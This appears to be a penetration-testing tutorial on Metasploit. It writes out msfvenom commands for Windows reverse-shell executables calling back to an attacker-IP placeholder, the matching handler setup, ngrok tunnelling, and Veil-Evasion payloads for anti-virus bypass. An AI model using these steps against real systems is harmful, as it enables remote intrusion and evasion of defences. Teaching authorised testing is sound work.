# System Hacking Techniques

## Disclaimer
*This documentation is intended solely for educational purposes. The techniques described here should only be used in authorized penetration testing scenarios or with explicit permission. Unauthorized use of these methods for malicious purposes is illegal and unethical.*

## Introduction to System Hacking
System hacking involves exploiting vulnerabilities in systems to gain unauthorized access or control. Ethical hackers use these techniques to identify and fix security weaknesses.

## Steps to Follow

### 1. Reconnaissance
- **Objective:** Gather information about the target system.
- **Techniques:** Passive and active information gathering.

### 2. Scanning
- **Objective:** Identify open ports and services.
- **Tools:** Nmap, Netcat.

### 3. Gaining Access
- **Objective:** Exploit vulnerabilities to gain access.
- **Techniques:** Using Metasploit, password attacks.

### 4. Maintaining Access
- **Objective:** Ensure continued access.
- **Techniques:** Backdoors, rootkits.

### 5. Covering Tracks
- **Objective:** Avoid detection.
- **Techniques:** Log tampering, hiding files.

## Metasploit Framework

### What is [Metasploit](https://www.metasploit.com/)?
Metasploit is a powerful tool for developing and executing exploit code against a remote target machine. It provides information about security vulnerabilities and aids in penetration testing.

### Why Use Metasploit?
- **Comprehensive:** Contains a wide range of exploits and payloads.
- **Ease of Use:** User-friendly interface and commands.
- **Community Support:** Active community and regular updates.

### Basic Usage

#### Installing Metasploit
- **On Kali Linux:**
  ```bash
  sudo apt update
  sudo apt install metasploit-framework
  ```

#### Starting Metasploit
```bash
msfconsole
```

#### Basic Commands
- **Search for Exploits:**
  ```bash
  search <exploit_name>
  ```
- **Use an Exploit:**
  ```bash
  use <exploit_path>
  ```
- **Set Options:**
  ```bash
  set <option_name> <value>
  ```
- **Run Exploit:**
  ```bash
  exploit
  ```

### Dummy Live Example

#### Scenario: Exploiting a Vulnerable Windows Machine

1. **Create Payload with msfvenom:**
   - msfvenom is a tool used to generate payloads that can be used in various exploits.
  
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe > shell.exe
   ```

2. **Start Metasploit Console:**
   ```bash
   msfconsole
   ```

3. **Set Up Exploit Handler:**
   ```bash
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <attacker_ip>
   set LPORT 4444
   exploit
   ```

4. **Deliver Payload to Target:**
   - Send the `shell.exe` file to the target machine and execute it.

5. **Meterpreter Session:**
   - If successful, you will get a meterpreter session.
   - Use `help` to see available commands.

### Advanced Topics

#### [NGROK](https://ngrok.com/)
Ngrok creates a secure tunnel to a localhost server, making it accessible remotely.

**Using NGROK:**
```bash
ngrok tcp 4444
# Generate payload with Ngrok IP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ngrok_ip> LPORT=<ngrok_port> -f exe > remote.exe
```

#### Obfuscation Techniques
Obfuscation makes payloads and exploits harder to detect by security systems.

**Common Techniques:**
- **Encoding**
- **Encryption**
- **String Concatenation**
- **Toggle Cases**

#### Tools for Obfuscation
- **[Veil-Evasion](https://github.com/Veil-Framework/Veil-Evasion):** A tool designed to generate metasploit payloads that bypass common anti-virus solutions.
- **[Shellter](https://www.shellterproject.com/):** A dynamic shellcode injection tool.

**Example Usage:**
```bash
veil
use python/meterpreter/rev_https
set LHOST <attacker_ip>
set LPORT 443
generate
```
